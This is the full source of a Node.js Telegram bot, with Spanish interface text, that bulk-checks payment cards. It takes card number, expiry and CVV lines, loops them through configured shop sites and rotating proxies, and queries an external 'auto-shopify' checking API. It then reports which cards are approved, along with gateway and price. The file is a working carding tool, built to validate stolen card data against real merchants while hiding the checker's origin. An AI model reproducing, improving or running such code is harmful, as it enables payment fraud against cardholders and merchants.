require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

/* ================== ENV ================== */
const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = Number(process.env.OWNER_ID);
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

/* ================== BOT ================== */
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================== DATA ================== */
const DATA_FILE = './data.json';
let data = fs.existsSync(DATA_FILE)
  ? JSON.parse(fs.readFileSync(DATA_FILE))
  : { sites: [], proxies: [], activeSite: null, activeProxy: null };

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  return id === OWNER_ID;
}

/* ================== RUNTIME ================== */
const running = {}; // chatId => boolean

/* ================== API ================== */
async function callChkAPI({ site, cc, proxy }) {
  try {
    const res = await axios.get(API_BASE, {
      params: { site, cc, proxy },
      timeout: 30000
    });
    const d = res.data || {};
    const response = String(d.Response || '').toUpperCase();
    return {
      approved: response.includes('APPRO'),
      response: d.Response || 'NO_RESPONSE',
      gateway: d.Gateway || 'N/A',
      price: d.Price || 'N/A',
      cc
    };
  } catch {
    return { approved: false, response: 'API_ERROR', cc };
  }
}

/* ================== UI ================== */
const mainMenu = {
  reply_markup: {
    inline_keyboard: [
      [{ text: '🚀 Multi CHK', callback_data: 'ui_multichk' }],
      [{ text: '🌐 Sites', callback_data: 'ui_sites' }, { text: '🧰 Proxies', callback_data: 'ui_proxies' }],
      [{ text: '📊 Estado', callback_data: 'ui_status' }],
      [{ text: '⚙️ Admin', callback_data: 'ui_admin' }],
      [{ text: '❓ Help', callback_data: 'ui_help' }],
      [{ text: '⛔ Stop', callback_data: 'ui_stop' }]
    ]
  }
};

const backMenu = {
  reply_markup: {
    inline_keyboard: [[{ text: '⬅️ Volver', callback_data: 'ui_back' }]]
  }
};

/* ================== START ================== */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 *Bot activo*

Usa los botones o comandos.
Todo es secuencial y estable.`,
    { parse_mode: 'Markdown', ...mainMenu }
  );
});

/* ================== HELP ================== */
bot.onText(/\/help/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`❓ *Ayuda*

• /multichk → ejecuta checks (secuencial)
• /stop → detiene el proceso

Formato correcto:
\`\`\`
/multichk
4111111111111111|12|28|123
\`\`\`

Los botones solo guían (no ejecutan).`,
    { parse_mode: 'Markdown', ...mainMenu }
  );
});

/* ================== CALLBACKS ================== */
bot.on('callback_query', (q) => {
  const chatId = q.message.chat.id;

  switch (q.data) {
    case 'ui_multichk':
      bot.sendMessage(
        chatId,
`🚀 *Multi CHK*

Formato:
\`\`\`
/multichk
4111111111111111|12|28|123
\`\`\`

Se probará con TODOS los sites y proxies.`,
        { parse_mode: 'Markdown', ...backMenu }
      );
      break;

    case 'ui_sites':
      bot.sendMessage(
        chatId,
`🌐 *Sites*

Actualmente hay **${data.sites.length}** site(s).
Configúralos en \`data.json\`.

Ejemplo:
\`\`\`
"sites": ["https://site1.com", "https://site2.com"]
\`\`\``,
        { parse_mode: 'Markdown', ...backMenu }
      );
      break;

    case 'ui_proxies':
      bot.sendMessage(
        chatId,
`🧰 *Proxies*

Actualmente hay **${data.proxies.length}** proxy(s).
Configúralos en \`data.json\`.

Ejemplo:
\`\`\`
"proxies": ["ip:port:user:pass"]
\`\`\``,
        { parse_mode: 'Markdown', ...backMenu }
      );
      break;

    case 'ui_status':
      bot.sendMessage(
        chatId,
`📊 *Estado actual*

🌐 Sites: ${data.sites.length}
🧰 Proxies: ${data.proxies.length}
⏳ En ejecución: ${running[chatId] ? 'Sí' : 'No'}`,
        { parse_mode: 'Markdown', ...backMenu }
      );
      break;

    case 'ui_admin':
      if (!isOwner(q.from.id)) {
        bot.sendMessage(chatId, '❌ Solo admin', backMenu);
        break;
      }
      bot.sendMessage(
        chatId,
`⚙️ *Panel Admin*

• Reinicia procesos
• Ver estado
• Control total`,
        { parse_mode: 'Markdown', ...backMenu }
      );
      break;

    case 'ui_help':
      bot.sendMessage(
        chatId,
`❓ *Help rápido*

Usa /multichk para ejecutar.
Usa /stop para detener.
Revisa Sites/Proxies desde botones.`,
        { parse_mode: 'Markdown', ...backMenu }
      );
      break;

    case 'ui_stop':
      running[chatId] = false;
      bot.sendMessage(chatId, '⛔ Proceso detenido');
      break;

    case 'ui_back':
      bot.sendMessage(chatId, 'Menú principal', mainMenu);
      break;
  }

  bot.answerCallbackQuery(q.id);
});

/* ================== MULTI-CHK ================== */
bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!data.sites.length || !data.proxies.length) {
    return bot.sendMessage(chatId, '❌ Añade sites y proxies en data.json primero');
  }

  const input = match[1].trim();
  if (!input) {
    return bot.sendMessage(
      chatId,
`❌ Formato incorrecto

Ejemplo:
\`\`\`
/multichk
4111111111111111|12|28|123
\`\`\``,
      { parse_mode: 'Markdown' }
    );
  }

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
  running[chatId] = true;

  let approved = 0;
  let declined = 0;

  const total = data.sites.length * data.proxies.length * ccs.length;
  let done = 0;

  const progressMsg = await bot.sendMessage(chatId, `⏳ 0/${total}\n✅ 0 ❌ 0`);

  for (const site of data.sites) {
    for (const proxy of data.proxies) {
      for (const cc of ccs) {
        if (!running[chatId]) break;

        const r = await callChkAPI({ site, cc, proxy });

        if (r.approved) {
          approved++;
          await bot.sendMessage(
            chatId,
`━━━━━━━━━━━━━━
💳 ${r.cc}
🏪 ${r.gateway}
💰 ${r.price}
✅ ${r.response}`
          );
        } else {
          declined++;
        }

        done++;
        try {
          await bot.editMessageText(
            `⏳ ${done}/${total}\n✅ ${approved} ❌ ${declined}`,
            { chat_id: chatId, message_id: progressMsg.message_id }
          );
        } catch {}
      }
      if (!running[chatId]) break;
    }
    if (!running[chatId]) break;
  }

  running[chatId] = false;

  bot.sendMessage(
    chatId,
`✅ *Finalizado*
Total: ${total}
Aprobadas: ${approved}
Rechazadas: ${declined}`,
    { parse_mode: 'Markdown' }
  );
});

/* ================== STOP ================== */
bot.onText(/\/stop/, (msg) => {
  running[msg.chat.id] = false;
  bot.sendMessage(msg.chat.id, '⛔ Proceso detenido');
});
